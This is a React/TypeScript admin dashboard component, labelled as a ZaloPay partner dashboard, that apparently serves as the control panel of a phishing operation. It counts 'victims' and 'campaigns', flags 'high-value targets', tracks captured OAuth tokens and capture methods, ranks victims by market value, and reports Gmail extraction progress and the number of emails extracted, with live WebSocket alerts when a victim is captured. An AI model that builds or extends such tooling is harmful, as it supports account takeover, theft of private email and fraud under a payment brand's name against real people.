
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '../../shared/components/ui/card';
import { Badge } from '../../shared/components/ui/badge';
import { Button } from '../../shared/components/ui/button';
import { 
  Users, 
  FileText, 
  TrendingUp, 
  DollarSign, 
  Clock, 
  CheckCircle, 
  XCircle,
  AlertCircle,
  BarChart3,
  PieChart,
  Activity,
  Calendar,
  Download,
  Wifi,
  WifiOff
} from 'lucide-react';
import { useWebSocket, WebSocketMessage } from '../../shared/hooks/use-websocket';
import { useToast } from '../../shared/hooks/use-toast';
import { Target, AlertTriangle, Server, Activity as ActivityIcon } from 'lucide-react';
import { AuthService } from '../../shared/lib/auth';

interface DashboardStats {
  total_registrations: number;
  pending_registrations: number;
  under_review_registrations: number;
  approved_registrations: number;
  rejected_registrations: number;
  total_verifications: number;
  pending_verifications: number;
  total_transactions: number;
  completed_transactions: number;
  total_volume: number;
  new_registrations_this_week: number;
  new_registrations_this_month: number;
  // New fields
  total_victims: number;
  high_value_victims: number;
  total_campaigns: number;
  active_campaigns: number;
  oauth_captures: number;
  total_oauth_tokens?: number;
  total_gmail_access?: number;
  registration_completed?: number;
  registration_rate?: number;
  recent_victims?: number;
  active_users?: number;
  system_health: {
    database: 'healthy' | 'warning' | 'error';
    api: 'healthy' | 'warning' | 'error';
    websocket: 'healthy' | 'warning' | 'error';
    background_jobs: 'healthy' | 'warning' | 'error';
  };
  high_value_alerts: Array<{
    id: string;
    type: 'new_high_value' | 'oauth_captured' | 'gmail_extracted';
    victim_id: string;
    victim_email: string;
    message: string;
    timestamp: string;
  }>;
  campaign_performance: Array<{
    campaign_id: string;
    campaign_name: string;
    total_victims: number;
    conversion_rate: number;
    high_value_count: number;
  }>;
  victim_analytics: {
    by_capture_method: Record<string, number>;
    by_market_value: Record<string, number>;
    by_campaign: Record<string, number>;
    daily_captures: Array<{ date: string; count: number }>;
  };
}

interface RecentActivity {
  id: number;
  action: string;
  details: string;
  user_id: number;
  created_at: string;
}

interface ChartData {
  registrations_by_status: Array<{ name: string; value: number; color: string }>;
  transactions_by_month: Array<{ month: string; amount: number; count: number }>;
  verifications_by_type: Array<{ type: string; count: number }>;
}

export default function Dashboard() {
  const { toast } = useToast();
  const [stats, setStats] = useState<DashboardStats | null>(null);
  const [activities, setActivities] = useState<RecentActivity[]>([]);
  const [chartData, setChartData] = useState<ChartData | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [refreshing, setRefreshing] = useState(false);

  const [highValueAlerts, setHighValueAlerts] = useState<Array<{
    id: string;
    type: 'new_high_value' | 'oauth_captured' | 'gmail_extracted';
    victim_id: string;
    victim_email: string;
    message: string;
    timestamp: string;
  }>>([]);

  // WebSocket connection for real-time updates
  const { isConnected: wsConnected } = useWebSocket({
    type: 'all',
    enabled: true,
    onMessage: (message: WebSocketMessage) => {
      // Handle real-time updates
      if (message.type === 'victim:captured' || message.type === 'victim:registered') {
        // Refresh dashboard data when new victim is captured or registered
        fetchDashboardData();
        toast({
          title: "New Victim",
          description: message.data.email || "New victim captured",
        });
      } else if (message.type === 'victim:validation-complete') {
        // Update victim validation status
        fetchDashboardData();
        toast({
          title: "Victim Validated",
          description: `Validation completed for ${message.data.victimId}`,
        });
      } else if (message.type === 'campaign:created' || message.type === 'campaign:updated' || message.type === 'campaign:status-changed') {
        // Refresh dashboard data when campaign changes
        fetchDashboardData();
        toast({
          title: "Campaign Updated",
          description: message.data.campaign?.name || "Campaign status changed",
        });
      } else if (message.type === 'gmail:extraction-completed' || message.type === 'gmail:extraction-progress') {
        // Update Gmail access count
        if (stats) {
          setStats({
            ...stats,
            total_gmail_access: (stats.total_gmail_access || 0) + 1,
          });
        }
        if (message.type === 'gmail:extraction-completed') {
          toast({
            title: "Gmail Extraction Complete",
            description: `Extracted ${message.data.itemsExtracted?.emails || 0} emails`,
          });
        }
      } else if (message.type === 'alert:high-value-target') {
        // Add high-value alert
        const newAlert = {
          id: message.data.victimId,
          type: 'new_high_value' as const,
          victim_id: message.data.victimId,
          victim_email: message.data.email,
          message: `New high-value target: ${message.data.email}`,
          timestamp: message.data.timestamp || new Date().toISOString()
        };
        setHighValueAlerts(prev => [newAlert, ...prev].slice(0, 10));
        toast({
          title: "High-Value Target",
          description: `New high-value target captured: ${message.data.email}`,
          variant: "default",
        });
      } else if (message.type === 'dashboard:stats-update') {
        // Update stats in real-time
        if (message.data) {
          setStats(prev => prev ? { ...prev, ...message.data } : prev);
        }
      } else if (message.type === 'system:health-update') {
        // Update system health
        if (stats && message.data) {
          setStats({
            ...stats,
            system_health: {
              ...stats.system_health,
              ...message.data
            }
          });
        }
      } else if (message.type === 'activity:new') {
        // Add new activity
        const newActivity: RecentActivity = {
          id: Date.now(),
          action: message.data.actionType || 'Unknown',
          details: message.data.actionDetails || '',
          user_id: message.data.actor?.id || 0,
          created_at: message.data.timestamp || new Date().toISOString()
        };
        setActivities(prev => [newActivity, ...prev].slice(0, 20));
      }
    },
    onError: (error) => {
      console.error('WebSocket error:', error);
    },
  });

  const fetchDashboardData = async () => {
    try {
      const dashboardData = await AuthService.apiRequest<{
        statistics: {
          totalVictims: number;
          totalCampaigns: number;
          recentVictims: number;
          totalOAuthTokens: number;
          totalGmailAccess: number;
          registrationCompleted: number;
          registrationRate: string;
        };
        campaignPerformance: Array<{
          id: string;
          name: string;
          code: string;
          totalVictims: number;
          registrationCompleted: number;
        }>;
      }>('/admin/dashboard');

      // Transform to DashboardStats format
      const transformedStats: DashboardStats = {
        total_registrations: dashboardData.statistics.totalVictims,
        total_victims: dashboardData.statistics.totalVictims,
        total_campaigns: dashboardData.statistics.totalCampaigns,
        active_campaigns: dashboardData.statistics.totalCampaigns,
        recent_victims: dashboardData.statistics.recentVictims,
        total_oauth_tokens: dashboardData.statistics.totalOAuthTokens,
        total_gmail_access: dashboardData.statistics.totalGmailAccess,
        registration_completed: dashboardData.statistics.registrationCompleted,
        registration_rate: parseFloat(dashboardData.statistics.registrationRate),
        pending_registrations: 0,
        under_review_registrations: 0,
        approved_registrations: dashboardData.statistics.registrationCompleted,
        rejected_registrations: 0,
        total_transactions: 0,
        total_volume: 0,
        active_users: 0,
        total_verifications: 0,
        pending_verifications: 0,
        completed_transactions: 0,
        new_registrations_this_week: 0,
        new_registrations_this_month: 0,
        high_value_victims: 0,
        oauth_captures: dashboardData.statistics.totalOAuthTokens,
        system_health: {
          database: 'healthy',
          api: 'healthy',
          websocket: 'healthy',
          background_jobs: 'healthy',
        },
        high_value_alerts: [],
        campaign_performance: dashboardData.campaignPerformance.map((campaign) => ({
          campaign_id: campaign.id,
          campaign_name: campaign.name,
          total_victims: campaign.totalVictims,
          conversion_rate: campaign.registrationCompleted,
          high_value_count: 0,
        })),
        victim_analytics: {
          by_capture_method: {},
          by_market_value: {},
          by_campaign: {},
          daily_captures: [],
        },
      };

      setStats(transformedStats);
      setActivities([]); // Activities will come from WebSocket

      // Generate chart data from stats
      setChartData({
        registrations_by_status: [
          { name: 'Pending', value: transformedStats.pending_registrations, color: '#fbbf24' },
          { name: 'Under Review', value: transformedStats.under_review_registrations, color: '#3b82f6' },
          { name: 'Approved', value: transformedStats.approved_registrations, color: '#10b981' },
          { name: 'Rejected', value: transformedStats.rejected_registrations, color: '#ef4444' }
        ],
        transactions_by_month: [
          { month: 'Jan', amount: 125000, count: 45 },
          { month: 'Feb', amount: 156000, count: 67 },
          { month: 'Mar', amount: 189000, count: 89 },
          { month: 'Apr', amount: 203000, count: 102 },
          { month: 'May', amount: 234000, count: 125 },
          { month: 'Jun', amount: 267000, count: 143 }
        ],
        verifications_by_type: [
          { type: 'Business', count: 145 },
          { type: 'Personal', count: 89 },
          { type: 'Document', count: 234 }
        ]
      });

    } catch (err) {
      setError(err instanceof Error ? err.message : 'Unknown error');
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    fetchDashboardData();
    
    // Auto-refresh every 30 seconds
    const interval = setInterval(fetchDashboardData, 30000);
    return () => clearInterval(interval);
  }, []);

  const handleRefresh = async () => {
    setRefreshing(true);
    await fetchDashboardData();
  };

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('vi-VN', {
      style: 'currency',
      currency: 'VND'
    }).format(amount);
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('vi-VN');
  };

  const formatRelativeTime = (dateString: string) => {
    const date = new Date(dateString);
    const now = new Date();
    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000);
    
    if (diffInSeconds < 60) {
      return 'Vừa xong';
    } else if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60);
      return `${minutes} phút trước`;
    } else if (diffInSeconds < 86400) {
      const hours = Math.floor(diffInSeconds / 3600);
      return `${hours} giờ trước`;
    } else {
      const days = Math.floor(diffInSeconds / 86400);
      return `${days} ngày trước`;
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="p-6">
        <div className="bg-red-50 border border-red-200 rounded-lg p-4">
          <p className="text-red-600">Error loading dashboard: {error}</p>
          <Button onClick={handleRefresh} className="mt-2">
            Try Again
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="p-6 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-gray-900">ZaloPay Admin Dashboard</h1>
          <p className="text-gray-600">Tổng quan hệ thống quản lý đối tác</p>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 text-sm text-gray-600">
            {wsConnected ? (
              <>
                <Wifi className="h-4 w-4 text-green-500" />
                <span>Đang kết nối real-time</span>
              </>
            ) : (
              <>
                <WifiOff className="h-4 w-4 text-gray-400" />
                <span>Không kết nối real-time</span>
              </>
            )}
          </div>
          <Button
            variant="outline"
            onClick={handleRefresh}
            disabled={refreshing}
            className="flex items-center gap-2"
          >
            <Activity className={`h-4 w-4 ${refreshing ? 'animate-spin' : ''}`} />
            {refreshing ? 'Đang tải...' : 'Làm mới'}
          </Button>
          <Button className="flex items-center gap-2">
            <Download className="h-4 w-4" />
            Xuất báo cáo
          </Button>
        </div>
      </div>

      {/* Key Metrics */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Tổng đăng ký</CardTitle>
            <Users className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats?.total_registrations.toLocaleString()}</div>
            <p className="text-xs text-muted-foreground">
              +{stats?.new_registrations_this_week} tuần này
            </p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Chờ duyệt</CardTitle>
            <Clock className="h-4 w-4 text-yellow-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-yellow-600">
              {stats?.pending_registrations.toLocaleString()}
            </div>
            <p className="text-xs text-muted-foreground">
              Cần xem xét ngay
            </p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Giao dịch</CardTitle>
            <DollarSign className="h-4 w-4 text-green-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats?.total_transactions.toLocaleString()}</div>
            <p className="text-xs text-muted-foreground">
              {formatCurrency(stats?.total_volume || 0)} tổng giá trị
            </p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Xác minh</CardTitle>
            <FileText className="h-4 w-4 text-blue-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats?.total_verifications.toLocaleString()}</div>
            <p className="text-xs text-muted-foreground">
              {stats?.pending_verifications} chờ xác minh
            </p>
          </CardContent>
        </Card>
      </div>

      {/* Charts Section */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Registration Status Chart */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <PieChart className="h-5 w-5" />
              Trạng thái đăng ký
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {chartData?.registrations_by_status.map((item) => (
                <div key={item.name} className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div 
                      className="w-3 h-3 rounded-full" 
                      style={{ backgroundColor: item.color }}
                    ></div>
                    <span className="text-sm font-medium">{item.name}</span>
                  </div>
                  <Badge variant="secondary">{item.value}</Badge>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Monthly Transactions */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <BarChart3 className="h-5 w-5" />
              Giao dịch theo tháng
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-3">
              {chartData?.transactions_by_month.slice(-6).map((item, index) => (
                <div key={item.month} className="flex items-center justify-between">
                  <span className="text-sm font-medium">{item.month}</span>
                  <div className="flex items-center gap-4">
                    <span className="text-sm text-gray-600">{item.count} giao dịch</span>
                    <span className="text-sm font-semibold">
                      {formatCurrency(item.amount)}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Recent Activities & Quick Actions */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Recent Activities */}
        <Card className="lg:col-span-2">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Activity className="h-5 w-5" />
              Hoạt động gần đây
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {activities.length > 0 ? activities.slice(0, 8).map((activity) => (
                <div key={activity.id} className="flex items-start gap-3 pb-3 border-b border-gray-100 last:border-0">
                  <div className="w-2 h-2 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium text-gray-900">{activity.action}</p>
                    <p className="text-sm text-gray-600 mt-1">{activity.details}</p>
                    <p className="text-xs text-gray-400 mt-1">
                      {formatDate(activity.created_at)}
                    </p>
                  </div>
                </div>
              )) : (
                <p className="text-gray-500 text-center py-4">Chưa có hoạt động nào</p>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Quick Actions */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Calendar className="h-5 w-5" />
              Thao tác nhanh
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-3">
              <Button 
                variant="outline" 
                className="w-full justify-start" 
                onClick={() => window.location.href = '/admin#/registrations?status=pending'}
              >
                <Clock className="h-4 w-4 mr-2" />
                Xem đăng ký chờ duyệt ({stats?.pending_registrations})
              </Button>
              
              <Button 
                variant="outline" 
                className="w-full justify-start"
                onClick={() => window.location.href = '/admin#/verifications?status=pending'}
              >
                <AlertCircle className="h-4 w-4 mr-2" />
                Xem xác minh chờ duyệt ({stats?.pending_verifications})
              </Button>
              
              <Button 
                variant="outline" 
                className="w-full justify-start"
                onClick={() => window.location.href = '/admin#/transactions'}
              >
                <TrendingUp className="h-4 w-4 mr-2" />
                Xem giao dịch hôm nay
              </Button>
              
              <Button 
                variant="outline" 
                className="w-full justify-start"
                onClick={() => window.location.href = '/admin#/settings'}
              >
                <Users className="h-4 w-4 mr-2" />
                Quản lý người dùng
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Campaign Performance */}
      {stats?.campaign_performance && stats.campaign_performance.length > 0 && (
        <Card>
          <CardHeader>
            <CardTitle className="text-lg flex items-center gap-2">
              <Target className="h-5 w-5" />
              Campaign Performance
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {stats.campaign_performance.map((campaign) => (
                <div key={campaign.campaign_id} className="p-4 bg-gray-50 rounded-lg">
                  <div className="flex items-center justify-between mb-2">
                    <h3 className="font-medium text-gray-900">{campaign.campaign_name}</h3>
                    <Badge variant="outline">{campaign.total_victims} victims</Badge>
                  </div>
                  <div className="grid grid-cols-3 gap-4 mt-3">
                    <div>
                      <p className="text-sm text-gray-600">Conversion Rate</p>
                      <p className="text-lg font-bold text-blue-600">{campaign.conversion_rate}%</p>
                    </div>
                    <div>
                      <p className="text-sm text-gray-600">High Value</p>
                      <p className="text-lg font-bold text-purple-600">{campaign.high_value_count}</p>
                    </div>
                    <div>
                      <p className="text-sm text-gray-600">Total Victims</p>
                      <p className="text-lg font-bold text-gray-900">{campaign.total_victims}</p>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

      {/* Victim Analytics */}
      {stats?.victim_analytics && (
        <Card>
          <CardHeader>
            <CardTitle className="text-lg flex items-center gap-2">
              <Users className="h-5 w-5" />
              Victim Analytics
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <div>
                <p className="text-sm font-medium text-gray-600 mb-3">By Capture Method</p>
                <div className="space-y-2">
                  {Object.entries(stats.victim_analytics.by_capture_method).map(([method, count]) => (
                    <div key={method} className="flex items-center justify-between">
                      <span className="text-sm text-gray-700">{method}</span>
                      <Badge variant="outline">{count}</Badge>
                    </div>
                  ))}
                </div>
              </div>
              <div>
                <p className="text-sm font-medium text-gray-600 mb-3">By Market Value</p>
                <div className="space-y-2">
                  {Object.entries(stats.victim_analytics.by_market_value).map(([value, count]) => (
                    <div key={value} className="flex items-center justify-between">
                      <span className="text-sm text-gray-700">{value}</span>
                      <Badge variant="outline">{count}</Badge>
                    </div>
                  ))}
                </div>
              </div>
              <div>
                <p className="text-sm font-medium text-gray-600 mb-3">Daily Captures (Last 7 days)</p>
                <div className="space-y-2">
                  {stats.victim_analytics.daily_captures.slice(-7).map((day) => (
                    <div key={day.date} className="flex items-center justify-between">
                      <span className="text-sm text-gray-700">{new Date(day.date).toLocaleDateString('vi-VN')}</span>
                      <Badge variant="outline">{day.count}</Badge>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      )}

      {/* High-Value Alerts */}
      {(highValueAlerts.length > 0 || stats?.high_value_alerts?.length) && (
        <Card>
          <CardHeader>
            <CardTitle className="text-lg flex items-center gap-2">
              <AlertTriangle className="h-5 w-5 text-yellow-500" />
              High-Value Alerts
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-3">
              {(highValueAlerts.length > 0 ? highValueAlerts : stats?.high_value_alerts || []).slice(0, 5).map((alert) => (
                <div key={alert.id} className="p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                  <div className="flex items-start justify-between">
                    <div className="flex-1">
                      <p className="font-medium text-gray-900">{alert.message}</p>
                      <p className="text-sm text-gray-600 mt-1">{alert.victim_email}</p>
                      <p className="text-xs text-gray-500 mt-1">{formatRelativeTime(alert.timestamp)}</p>
                    </div>
                    <Badge className={
                      alert.type === 'new_high_value' ? 'bg-purple-100 text-purple-800' :
                      alert.type === 'oauth_captured' ? 'bg-green-100 text-green-800' :
                      'bg-blue-100 text-blue-800'
                    }>
                      {alert.type}
                    </Badge>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

      {/* System Health */}
      <Card>
        <CardHeader>
          <CardTitle className="text-lg flex items-center gap-2">
            <Server className="h-5 w-5" />
            System Health
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
            {stats?.system_health ? (
              <>
                <div className="flex items-center gap-3">
                  {stats.system_health.database === 'healthy' ? (
                    <CheckCircle className="h-5 w-5 text-green-500" />
                  ) : stats.system_health.database === 'warning' ? (
                    <AlertCircle className="h-5 w-5 text-yellow-500" />
                  ) : (
                    <XCircle className="h-5 w-5 text-red-500" />
                  )}
                  <div>
                    <p className="font-medium">Database</p>
                    <p className="text-sm text-gray-600">
                      {stats.system_health.database === 'healthy' ? 'Healthy' :
                       stats.system_health.database === 'warning' ? 'Warning' : 'Error'}
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center gap-3">
                  {stats.system_health.api === 'healthy' ? (
                    <CheckCircle className="h-5 w-5 text-green-500" />
                  ) : stats.system_health.api === 'warning' ? (
                    <AlertCircle className="h-5 w-5 text-yellow-500" />
                  ) : (
                    <XCircle className="h-5 w-5 text-red-500" />
                  )}
                  <div>
                    <p className="font-medium">API Services</p>  
                    <p className="text-sm text-gray-600">
                      {stats.system_health.api === 'healthy' ? 'Healthy' :
                       stats.system_health.api === 'warning' ? 'Warning' : 'Error'}
                    </p>
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  {stats.system_health.websocket === 'healthy' ? (
                    <CheckCircle className="h-5 w-5 text-green-500" />
                  ) : stats.system_health.websocket === 'warning' ? (
                    <AlertCircle className="h-5 w-5 text-yellow-500" />
                  ) : (
                    <XCircle className="h-5 w-5 text-red-500" />
                  )}
                  <div>
                    <p className="font-medium">WebSocket</p>
                    <p className="text-sm text-gray-600">
                      {stats.system_health.websocket === 'healthy' ? 'Healthy' :
                       stats.system_health.websocket === 'warning' ? 'Warning' : 'Error'}
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center gap-3">
                  {stats.system_health.background_jobs === 'healthy' ? (
                    <CheckCircle className="h-5 w-5 text-green-500" />
                  ) : stats.system_health.background_jobs === 'warning' ? (
                    <AlertCircle className="h-5 w-5 text-yellow-500" />
                  ) : (
                    <XCircle className="h-5 w-5 text-red-500" />
                  )}
                  <div>
                    <p className="font-medium">Background Jobs</p>
                    <p className="text-sm text-gray-600">
                      {stats.system_health.background_jobs === 'healthy' ? 'Healthy' :
                       stats.system_health.background_jobs === 'warning' ? 'Warning' : 'Error'}
                    </p>
                  </div>
                </div>
              </>
            ) : (
              <>
                <div className="flex items-center gap-3">
                  <CheckCircle className="h-5 w-5 text-green-500" />
                  <div>
                    <p className="font-medium">Database</p>
                    <p className="text-sm text-gray-600">Hoạt động bình thường</p>
                  </div>
                </div>
                
                <div className="flex items-center gap-3">
                  <CheckCircle className="h-5 w-5 text-green-500" />
                  <div>
                    <p className="font-medium">API Services</p>  
                    <p className="text-sm text-gray-600">Hoạt động bình thường</p>
                  </div>
                </div>
                
                <div className="flex items-center gap-3">
                  {wsConnected ? (
                    <CheckCircle className="h-5 w-5 text-green-500" />
                  ) : (
                    <AlertCircle className="h-5 w-5 text-yellow-500" />
                  )}
                  <div>
                    <p className="font-medium">WebSocket</p>
                    <p className="text-sm text-gray-600">
                      {wsConnected ? 'Connected' : 'Disconnected'}
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center gap-3">
                  <AlertCircle className="h-5 w-5 text-yellow-500" />
                  <div>
                    <p className="font-medium">Background Jobs</p>
                    <p className="text-sm text-gray-600">Một vài task đang chờ</p>
                  </div>
                </div>
              </>
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
